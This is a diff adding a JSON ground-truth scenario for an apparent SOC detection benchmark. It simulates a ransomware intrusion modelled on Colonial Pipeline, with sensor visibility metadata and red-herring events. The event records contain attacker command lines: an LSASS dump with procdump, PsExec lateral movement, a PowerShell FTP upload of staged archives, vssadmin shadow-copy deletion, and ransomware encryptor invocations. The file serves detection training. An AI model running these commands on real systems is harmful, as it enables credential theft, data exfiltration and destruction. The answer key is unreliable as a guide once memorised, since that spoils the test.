@@ -1,0 +1,776 @@
+{
+  "schema_version": 1,
+  "scenario_name": "colonial-pipeline",
+  "scenario_description": "Colonial Pipeline-style enterprise ransomware scenario with compromised VPN access,\ncredential theft, PsExec lateral movement, staged collection, dual-channel exfiltration,\nshadow-copy deletion, and dual file-server encryption. Designed for SOC-bench truth\nprojection and partial sensor visibility (DP4).\n",
+  "generated_at": "2024-06-03T08:00:00Z",
+  "observation_profile": "enterprise_standard",
+  "collection_window": {
+    "start": "2024-06-03T08:00:00Z",
+    "end": "2024-06-03T12:00:00Z"
+  },
+  "source_evidence_status": {
+    "evt-001": {
+      "asa": {
+        "delayed": 2
+      },
+      "ecar": {
+        "delayed": 5
+      },
+      "syslog": {
+        "delayed": 4
+      },
+      "zeek": {
+        "delayed": 3
+      }
+    },
+    "evt-002": {
+      "asa": {
+        "delayed": 2,
+        "filtered": 1
+      },
+      "ecar": {
+        "delayed": 10
+      },
+      "sysmon": {
+        "delayed": 9
+      },
+      "windows_security": {
+        "delayed": 10
+      },
+      "zeek": {
+        "delayed": 3,
+        "visible": 2
+      }
+    },
+    "evt-003": {
+      "ecar": {
+        "delayed": 6
+      },
+      "sysmon": {
+        "delayed": 6
+      },
+      "windows_security": {
+        "delayed": 2
+      }
+    },
+    "evt-004": {
+      "ecar": {
+        "delayed": 3
+      },
+      "sysmon": {
+        "delayed": 3
+      },
+      "windows_security": {
+        "delayed": 2
+      }
+    },
+    "evt-004b": {
+      "asa": {
+        "delayed": 2
+      },
+      "ecar": {
+        "delayed": 4
+      },
+      "sysmon": {
+        "delayed": 3
+      },
+      "windows_security": {
+        "delayed": 4
+      },
+      "zeek": {
+        "delayed": 1,
+        "visible": 2
+      }
+    },
+    "evt-005": {
+      "asa": {
+        "delayed": 1
+      },
+      "ecar": {
+        "delayed": 5
+      },
+      "sysmon": {
+        "delayed": 3
+      },
+      "windows_security": {
+        "delayed": 8
+      },
+      "zeek": {
+        "delayed": 1
+      }
+    },
+    "evt-005b": {
+      "asa": {
+        "delayed": 1
+      },
+      "ecar": {
+        "delayed": 2
+      },
+      "sysmon": {
+        "delayed": 1
+      },
+      "windows_security": {
+        "delayed": 4
+      },
+      "zeek": {
+        "delayed": 1
+      }
+    },
+    "evt-006a": {
+      "ecar": {
+        "delayed": 2,
+        "dropped": 3
+      },
+      "sysmon": {
+        "delayed": 5
+      },
+      "windows_security": {
+        "delayed": 4
+      }
+    },
+    "evt-006b": {
+      "asa": {
+        "delayed": 1,
+        "filtered": 2
+      },
+      "ecar": {
+        "delayed": 14,
+        "dropped": 1
+      },
+      "sysmon": {
+        "delayed": 12
+      },
+      "windows_security": {
+        "delayed": 10
+      },
+      "zeek": {
+        "delayed": 2,
+        "filtered": 3
+      }
+    },
+    "evt-007": {
+      "asa": {
+        "delayed": 4
+      },
+      "ecar": {
+        "delayed": 9
+      },
+      "syslog": {
+        "delayed": 1
+      },
+      "zeek": {
+        "delayed": 6,
+        "visible": 1
+      }
+    },
+    "evt-008": {
+      "ecar": {
+        "delayed": 3
+      },
+      "sysmon": {
+        "delayed": 3
+      },
+      "windows_security": {
+        "delayed": 2
+      }
+    },
+    "evt-009a": {
+      "ecar": {
+        "delayed": 3
+      },
+      "sysmon": {
+        "delayed": 3
+      },
+      "windows_security": {
+        "delayed": 2
+      }
+    },
+    "evt-009b": {
+      "ecar": {
+        "delayed": 3
+      },
+      "sysmon": {
+        "delayed": 3
+      },
+      "windows_security": {
+        "delayed": 2
+      }
+    },
+    "red_herring:rh-001": {
+      "asa": {
+        "delayed": 1
+      },
+      "ecar": {
+        "delayed": 4
+      },
+      "sysmon": {
+        "delayed": 3
+      },
+      "windows_security": {
+        "delayed": 6
+      },
+      "zeek": {
+        "visible": 1
+      }
+    }
+  },
+  "storyline_steps": [
+    {
+      "storyline_id": "evt-001",
+      "index": 0,
+      "actor": "t.morgan",
+      "system": "VPN-GW-01",
+      "activity": "Attacker authenticates to corporate VPN using compromised operations account",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "connection",
+        "ssh_session"
+      ]
+    },
+    {
+      "storyline_id": "evt-002",
+      "index": 1,
+      "actor": "t.morgan",
+      "system": "WKS-OPS-01",
+      "activity": "Attacker enumerates Active Directory trusts and visible file servers",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "process",
+        "rdp_session"
+      ]
+    },
+    {
+      "storyline_id": "evt-003",
+      "index": 2,
+      "actor": "t.morgan",
+      "system": "WKS-OPS-01",
+      "activity": "Attacker dumps credentials from LSASS using bundled tooling",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "create_remote_thread",
+        "process"
+      ]
+    },
+    {
+      "storyline_id": "evt-004",
+      "index": 3,
+      "actor": "t.morgan",
+      "system": "WKS-OPS-01",
+      "activity": "Attacker launches PsExec against the primary file server",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "process"
+      ]
+    },
+    {
+      "storyline_id": "evt-004b",
+      "index": 4,
+      "actor": "t.morgan",
+      "system": "FS-01",
+      "activity": "PsExec installs its remote helper service on FS-01",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "service_installed"
+      ]
+    },
+    {
+      "storyline_id": "evt-005",
+      "index": 5,
+      "actor": "t.morgan",
+      "system": "FS-01",
+      "activity": "Attacker uses recovered admin credentials for SMB access to FS-01",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "explicit_credentials",
+        "logon"
+      ]
+    },
+    {
+      "storyline_id": "evt-005b",
+      "index": 6,
+      "actor": "t.morgan",
+      "system": "FS-02",
+      "activity": "Attacker extends SMB administrative access to FS-02",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "logon"
+      ]
+    },
+    {
+      "storyline_id": "evt-006a",
+      "index": 7,
+      "actor": "t.morgan",
+      "system": "FS-01",
+      "activity": "Attacker archives finance and SCADA-adjacent documents from FS-01",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "process"
+      ]
+    },
+    {
+      "storyline_id": "evt-006b",
+      "index": 8,
+      "actor": "t.morgan",
+      "system": "FS-01",
+      "activity": "Attacker transfers staged archive to internal FTP staging server",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "connection",
+        "process"
+      ]
+    },
+    {
+      "storyline_id": "evt-007",
+      "index": 9,
+      "actor": "ftp-staging",
+      "system": "FTP-01",
+      "activity": "Attacker exfiltrates staged archive over FTP and HTTPS to external infrastructure",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "connection"
+      ]
+    },
+    {
+      "storyline_id": "evt-008",
+      "index": 10,
+      "actor": "t.morgan",
+      "system": "FS-01",
+      "activity": "Attacker deletes volume shadow copies before encryption",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "process"
+      ]
+    },
+    {
+      "storyline_id": "evt-009a",
+      "index": 11,
+      "actor": "t.morgan",
+      "system": "FS-01",
+      "activity": "Ransomware encryptor deployed against FS-01 shares",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "process"
+      ]
+    },
+    {
+      "storyline_id": "evt-009b",
+      "index": 12,
+      "actor": "t.morgan",
+      "system": "FS-02",
+      "activity": "Ransomware encryptor deployed against FS-02 departmental shares",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "process"
+      ]
+    }
+  ],
+  "red_herring_steps": [
+    {
+      "storyline_id": "rh-001",
+      "index": 0,
+      "actor": "s.kim",
+      "system": "FS-02",
+      "activity": "Scheduled backup verification by IT administrator",
+      "ground_truth_section": "red_herring",
+      "event_types": [
+        "logon",
+        "process"
+      ],
+      "explanation": "Legitimate backup agent health check outside the primary backup window"
+    },
+    {
+      "storyline_id": "rh-002",
+      "index": 1,
+      "actor": "p.brown",
+      "system": "OT-HMI-01",
+      "activity": "OT operator reconnects to HMI after overnight maintenance",
+      "ground_truth_section": "red_herring",
+      "event_types": [
+        "logon"
+      ],
+      "explanation": "Expected OT shift handoff activity; not attacker-related"
+    }
+  ],
+  "events": [
+    {
+      "record_id": "evt-001#0",
+      "kind": "connection",
+      "storyline_id": "evt-001",
+      "time": "2024-06-03T08:02:45Z",
+      "actor": "t.morgan",
+      "system": "VPN-GW-01",
+      "activity": "Attacker authenticates to corporate VPN using compromised operations account",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "dst_ip": "10.60.10.10",
+        "dst_port": 1194,
+        "uid": "CiMxFEIvpLA9eIYzXQ"
+      }
+    },
+    {
+      "record_id": "evt-001#1",
+      "kind": "ssh_session",
+      "storyline_id": "evt-001",
+      "time": "2024-06-03T08:02:46Z",
+      "actor": "t.morgan",
+      "system": "VPN-GW-01",
+      "activity": "Attacker authenticates to corporate VPN using compromised operations account",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "dst_ip": "10.60.10.10",
+        "dst_port": 22,
+        "uid": "C21RJD4ijTg5oiLiS3y"
+      }
+    },
+    {
+      "record_id": "evt-002#0",
+      "kind": "rdp_session",
+      "storyline_id": "evt-002",
+      "time": "2024-06-03T08:18:27Z",
+      "actor": "t.morgan",
+      "system": "WKS-OPS-01",
+      "activity": "Attacker enumerates Active Directory trusts and visible file servers",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "dst_ip": "10.60.20.21",
+        "dst_port": 3389,
+        "uid": "CH7V23vussAlqjAUFr"
+      }
+    },
+    {
+      "record_id": "evt-002#1",
+      "kind": "process",
+      "storyline_id": "evt-002",
+      "time": "2024-06-03T08:18:29Z",
+      "actor": "t.morgan",
+      "system": "WKS-OPS-01",
+      "activity": "Attacker enumerates Active Directory trusts and visible file servers",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "nltest /dclist:colonial-energy",
+        "pid": 5452,
+        "process_name": "C:\\Windows\\System32\\nltest.exe"
+      }
+    },
+    {
+      "record_id": "evt-002#2",
+      "kind": "process",
+      "storyline_id": "evt-002",
+      "time": "2024-06-03T08:18:32Z",
+      "actor": "t.morgan",
+      "system": "WKS-OPS-01",
+      "activity": "Attacker enumerates Active Directory trusts and visible file servers",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "net view /domain:colonial-energy",
+        "pid": 5492,
+        "process_name": "C:\\Windows\\System32\\net.exe"
+      }
+    },
+    {
+      "record_id": "evt-003#0",
+      "kind": "process",
+      "storyline_id": "evt-003",
+      "time": "2024-06-03T08:33:35Z",
+      "actor": "t.morgan",
+      "system": "WKS-OPS-01",
+      "activity": "Attacker dumps credentials from LSASS using bundled tooling",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\ops-lsass.dmp",
+        "pid": 5496,
+        "process_name": "C:\\Windows\\Temp\\procdump64.exe"
+      }
+    },
+    {
+      "record_id": "evt-003#1",
+      "kind": "create_remote_thread",
+      "storyline_id": "evt-003",
+      "time": "2024-06-03T08:33:37Z",
+      "actor": "t.morgan",
+      "system": "WKS-OPS-01",
+      "activity": "Attacker dumps credentials from LSASS using bundled tooling",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "target_process": "C:\\Windows\\System32\\lsass.exe"
+      }
+    },
+    {
+      "record_id": "evt-004#0",
+      "kind": "process",
+      "storyline_id": "evt-004",
+      "time": "2024-06-03T08:46:15Z",
+      "actor": "t.morgan",
+      "system": "WKS-OPS-01",
+      "activity": "Attacker launches PsExec against the primary file server",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "PsExec.exe \\\\FS-01 -accepteula -s cmd.exe /c whoami",
+        "pid": 5508,
+        "process_name": "C:\\Windows\\Temp\\PsExec.exe"
+      }
+    },
+    {
+      "record_id": "evt-004b#0",
+      "kind": "service_installed",
+      "storyline_id": "evt-004b",
+      "time": "2024-06-03T08:47:19Z",
+      "actor": "t.morgan",
+      "system": "FS-01",
+      "activity": "PsExec installs its remote helper service on FS-01",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "service_file_name": "C:\\Windows\\PSEXESVC.exe",
+        "service_name": "PSEXESVC"
+      }
+    },
+    {
+      "record_id": "evt-005#0",
+      "kind": "explicit_credentials",
+      "storyline_id": "evt-005",
+      "time": "2024-06-03T08:52:24Z",
+      "actor": "t.morgan",
+      "system": "FS-01",
+      "activity": "Attacker uses recovered admin credentials for SMB access to FS-01",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "target_server": "FS-01",
+        "target_username": "COLONIAL-ENERGY\\s.kim"
+      }
+    },
+    {
+      "record_id": "evt-005#1",
+      "kind": "logon",
+      "storyline_id": "evt-005",
+      "time": "2024-06-03T08:52:28Z",
+      "actor": "t.morgan",
+      "system": "FS-01",
+      "activity": "Attacker uses recovered admin credentials for SMB access to FS-01",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "logon_id": "0xd19c221",
+        "source_ip": "10.60.20.21"
+      }
+    },
+    {
+      "record_id": "evt-005b#0",
+      "kind": "logon",
+      "storyline_id": "evt-005b",
+      "time": "2024-06-03T08:54:20Z",
+      "actor": "t.morgan",
+      "system": "FS-02",
+      "activity": "Attacker extends SMB administrative access to FS-02",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "logon_id": "0x957a88f",
+        "source_ip": "10.60.20.21"
+      }
+    },
+    {
+      "record_id": "evt-006a#0",
+      "kind": "process",
+      "storyline_id": "evt-006a",
+      "time": "2024-06-03T09:09:55Z",
+      "actor": "t.morgan",
+      "system": "FS-01",
+      "activity": "Attacker archives finance and SCADA-adjacent documents from FS-01",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "powershell.exe -NoProfile -Command \"Compress-Archive -Path \\\\\\\\FS-01\\\\Finance,\\\\\\\\FS-01\\\\Engineering\\\\SCADA-Exports -DestinationPath C:\\\\Windows\\\\Temp\\\\stage-fs01.zip -Force\"",
+        "pid": 5200,
+        "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "staged_archive": "C:\\\\Windows\\\\Temp\\\\stage-fs01.zip"
+      }
+    },
+    {
+      "record_id": "evt-006a#1",
+      "kind": "process",
+      "storyline_id": "evt-006a",
+      "time": "2024-06-03T09:10:00Z",
+      "actor": "t.morgan",
+      "system": "FS-01",
+      "activity": "Attacker archives finance and SCADA-adjacent documents from FS-01",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "xcopy C:\\Windows\\Temp\\stage-fs01.zip \\\\FS-01\\Staging\\ /Y",
+        "pid": 5204,
+        "process_name": "C:\\Windows\\System32\\xcopy.exe"
+      }
+    },
+    {
+      "record_id": "evt-006b#0",
+      "kind": "connection",
+      "storyline_id": "evt-006b",
+      "time": "2024-06-03T09:18:22Z",
+      "actor": "t.morgan",
+      "system": "FS-01",
+      "activity": "Attacker transfers staged archive to internal FTP staging server",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "dst_ip": "10.60.30.40",
+        "dst_port": 21,
+        "uid": "(filtered by sensor placement)"
+      }
+    },
+    {
+      "record_id": "evt-006b#1",
+      "kind": "process",
+      "storyline_id": "evt-006b",
+      "time": "2024-06-03T09:18:23Z",
+      "actor": "t.morgan",
+      "system": "FS-01",
+      "activity": "Attacker transfers staged archive to internal FTP staging server",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "powershell.exe -NoProfile -Command \"$client = New-Object Net.WebClient; $client.UploadFile('ftp://10.60.30.40/incoming/stage-fs01.zip', 'C:\\\\Windows\\\\Temp\\\\stage-fs01.zip')\"",
+        "pid": 5296,
+        "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      }
+    },
+    {
+      "record_id": "evt-007#0",
+      "kind": "connection",
+      "storyline_id": "evt-007",
+      "time": "2024-06-03T09:36:18Z",
+      "actor": "ftp-staging",
+      "system": "FTP-01",
+      "activity": "Attacker exfiltrates staged archive over FTP and HTTPS to external infrastructure",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "dst_ip": "203.0.113.88",
+        "dst_port": 21,
+        "uid": "C9dmttnOgJOCApSnoD"
+      }
+    },
+    {
+      "record_id": "evt-007#1",
+      "kind": "connection",
+      "storyline_id": "evt-007",
+      "time": "2024-06-03T09:36:21Z",
+      "actor": "ftp-staging",
+      "system": "FTP-01",
+      "activity": "Attacker exfiltrates staged archive over FTP and HTTPS to external infrastructure",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "dst_ip": "203.0.113.90",
+        "dst_port": 443,
+        "uid": "C5YtR44NxGf2T3IjXN"
+      }
+    },
+    {
+      "record_id": "evt-008#0",
+      "kind": "process",
+      "storyline_id": "evt-008",
+      "time": "2024-06-03T09:59:39Z",
+      "actor": "t.morgan",
+      "system": "FS-01",
+      "activity": "Attacker deletes volume shadow copies before encryption",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "vssadmin.exe delete shadows /all /quiet",
+        "pid": 5688,
+        "process_name": "C:\\Windows\\System32\\vssadmin.exe"
+      }
+    },
+    {
+      "record_id": "evt-009a#0",
+      "kind": "process",
+      "storyline_id": "evt-009a",
+      "time": "2024-06-03T10:05:31Z",
+      "actor": "t.morgan",
+      "system": "FS-01",
+      "activity": "Ransomware encryptor deployed against FS-01 shares",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "C:\\\\ProgramData\\\\darkside_svc.exe --encrypt \\\\\\\\FS-01\\\\Finance \\\\\\\\FS-01\\\\Engineering \\\\\\\\FS-01\\\\HR --key-id 0x733100",
+        "pid": 5756,
+        "process_name": "C:\\ProgramData\\darkside_svc.exe"
+      }
+    },
+    {
+      "record_id": "evt-009b#0",
+      "kind": "process",
+      "storyline_id": "evt-009b",
+      "time": "2024-06-03T10:11:11Z",
+      "actor": "t.morgan",
+      "system": "FS-02",
+      "activity": "Ransomware encryptor deployed against FS-02 departmental shares",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "C:\\\\ProgramData\\\\darkside_svc.exe --encrypt \\\\\\\\FS-02\\\\Operations \\\\\\\\FS-02\\\\Contracts --key-id 0x733100",
+        "pid": 5776,
+        "process_name": "C:\\ProgramData\\darkside_svc.exe"
+      }
+    },
+    {
+      "record_id": "red_herring:rh-001#0",
+      "kind": "logon",
+      "storyline_id": "red_herring:rh-001",
+      "time": "2024-06-03T09:04:50Z",
+      "actor": "s.kim",
+      "system": "FS-02",
+      "activity": "Scheduled backup verification by IT administrator",
+      "ground_truth_section": "red_herring",
+      "emitted": true,
+      "explanation": "Legitimate backup agent health check outside the primary backup window",
+      "attributes": {
+        "logon_id": "0x958fce2",
+        "source_ip": "10.60.20.14"
+      }
+    },
+    {
+      "record_id": "red_herring:rh-001#1",
+      "kind": "process",
+      "storyline_id": "red_herring:rh-001",
+      "time": "2024-06-03T09:04:51Z",
+      "actor": "s.kim",
+      "system": "FS-02",
+      "activity": "Scheduled backup verification by IT administrator",
+      "ground_truth_section": "red_herring",
+      "emitted": true,
+      "explanation": "Legitimate backup agent health check outside the primary backup window",
+      "attributes": {
+        "command_line": "powershell.exe -NoProfile -Command Get-SmbShare",
+        "pid": 5356,
+        "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      }
+    },
+    {
+      "record_id": "red_herring:rh-002#0",
+      "kind": "logon",
+      "storyline_id": "red_herring:rh-002",
+      "time": "2024-06-03T09:49:42Z",
+      "actor": "p.brown",
+      "system": "OT-HMI-01",
+      "activity": "OT operator reconnects to HMI after overnight maintenance",
+      "ground_truth_section": "red_herring",
+      "emitted": true,
+      "explanation": "Expected OT shift handoff activity; not attacker-related",
+      "attributes": {
+        "logon_id": "0x2ec4b60",
+        "source_ip": "45.33.32.156"
+      }
+    }
+  ]
+}
